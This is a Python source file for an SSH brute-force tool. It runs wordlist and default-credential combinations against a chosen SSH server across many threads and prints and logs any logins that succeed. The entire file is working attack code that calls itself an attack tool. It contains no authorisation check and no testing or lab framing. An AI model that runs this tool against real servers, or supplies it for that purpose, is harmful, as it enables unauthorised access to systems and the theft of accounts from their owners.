#!/usr/bin/env python3
"""
SSH Bruteforce Tool
Main module for conducting SSH bruteforce attacks
"""

import paramiko
import threading
import time
import argparse
import sys
from queue import Queue
from tqdm import tqdm
from colorama import init, Fore, Style

from .config import Config
from .utils.logger import Logger
from .utils.wordlist_manager import WordlistManager

init()  # Initialize colorama


class SSHBruteforce:
    """Main SSH Bruteforce class"""
    
    def __init__(self, target_host, port=22, timeout=5, max_threads=10):
        """
        Initialize SSH Bruteforce object
        
        Args:
            target_host (str): Target SSH server hostname/IP
            port (int): SSH port (default: 22)
            timeout (int): Connection timeout in seconds
            max_threads (int): Maximum number of threads
        """
        self.target_host = target_host
        self.port = port
        self.timeout = timeout
        self.max_threads = max_threads
        self.config = Config()
        self.logger = Logger()
        self.wordlist_manager = WordlistManager()
        
        self.found_credentials = []
        self.attempts = 0
        self.lock = threading.Lock()
        self.queue = Queue()
        
    def ssh_connect(self, username, password):
        """
        Attempt SSH connection with given credentials
        
        Args:
            username (str): Username to try
            password (str): Password to try
            
        Returns:
            bool: True if connection successful, False otherwise
        """
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh_client.connect(
                hostname=self.target_host,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout
            )
            
            ssh_client.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            self.logger.log_error(f"Connection error: {str(e)}")
            return False
    
    def worker(self, progress_bar):
        """
        Worker thread function
        
        Args:
            progress_bar: tqdm progress bar object
        """
        while not self.queue.empty():
            try:
                username, password = self.queue.get(timeout=1)
                
                with self.lock:
                    self.attempts += 1
                    current_attempt = self.attempts
                
                # Log attempt
                self.logger.log_attempt(username, password, self.target_host)
                
                # Try connection
                if self.ssh_connect(username, password):
                    success_msg = f"SUCCESS: {username}:{password}@{self.target_host}"
                    print(f"\n{Fore.GREEN}{success_msg}{Style.RESET_ALL}")
                    
                    with self.lock:
                        self.found_credentials.append((username, password))
                        self.logger.log_success(username, password, self.target_host)
                
                # Update progress
                progress_bar.update(1)
                progress_bar.set_description(f"Trying {username}:{password[:10]}...")
                
                # Small delay to prevent overwhelming the target
                time.sleep(self.config.get('delay_between_attempts', 0.1))
                
                self.queue.task_done()
                
            except Exception as e:
                self.logger.log_error(f"Worker error: {str(e)}")
                continue
    
    def load_credential_combinations(self, userlist_file=None, passlist_file=None):
        """
        Load username and password combinations
        
        Args:
            userlist_file (str): Path to username wordlist
            passlist_file (str): Path to password wordlist
        """
        # Load wordlists
        usernames = self.wordlist_manager.load_wordlist(
            userlist_file or "wordlists/common_users.txt"
        )
        passwords = self.wordlist_manager.load_wordlist(
            passlist_file or "wordlists/common_passwords.txt"
        )
        
        # Create combinations
        for username in usernames:
            for password in passwords:
                self.queue.put((username.strip(), password.strip()))
        
        # Load default credentials
        default_creds = self.wordlist_manager.load_default_credentials()
        for username, password in default_creds:
            self.queue.put((username, password))
    
    def run(self, userlist_file=None, passlist_file=None):
        """
        Start the bruteforce attack
        
        Args:
            userlist_file (str): Path to username wordlist
            passlist_file (str): Path to password wordlist
        """
        print(f"{Fore.CYAN}SSH Bruteforce Tool v1.0{Style.RESET_ALL}")
        print(f"Target: {self.target_host}:{self.port}")
        print(f"Threads: {self.max_threads}")
        print("-" * 50)
        
        # Load credentials
        self.load_credential_combinations(userlist_file, passlist_file)
        total_combinations = self.queue.qsize()
        
        print(f"Loaded {total_combinations} credential combinations")
        print("Starting attack...\n")
        
        # Initialize progress bar
        progress_bar = tqdm(
            total=total_combinations,
            desc="Bruteforcing",
            unit="attempts",
            colour="blue"
        )
        
        # Start worker threads
        threads = []
        for _ in range(min(self.max_threads, total_combinations)):
            thread = threading.Thread(target=self.worker, args=(progress_bar,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        progress_bar.close()
        
        # Print results
        print("\n" + "=" * 50)
        if self.found_credentials:
            print(f"{Fore.GREEN}FOUND CREDENTIALS:{Style.RESET_ALL}")
            for username, password in self.found_credentials:
                print(f"  {username}:{password}")
        else:
            print(f"{Fore.RED}No valid credentials found{Style.RESET_ALL}")
        
        print(f"\nTotal attempts: {self.attempts}")
        print(f"Found: {len(self.found_credentials)} valid credential(s)")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="SSH Bruteforce Tool")
    parser.add_argument("target", help="Target SSH server (IP or hostname)")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH port (default: 22)")
    parser.add_argument("-u", "--userlist", help="Username wordlist file")
    parser.add_argument("-P", "--passlist", help="Password wordlist file")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=5, help="Connection timeout (default: 5)")
    
    args = parser.parse_args()
    
    try:
        bruteforcer = SSHBruteforce(
            target_host=args.target,
            port=args.port,
            timeout=args.timeout,
            max_threads=args.threads
        )
        
        bruteforcer.run(
            userlist_file=args.userlist,
            passlist_file=args.passlist
        )
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Attack interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
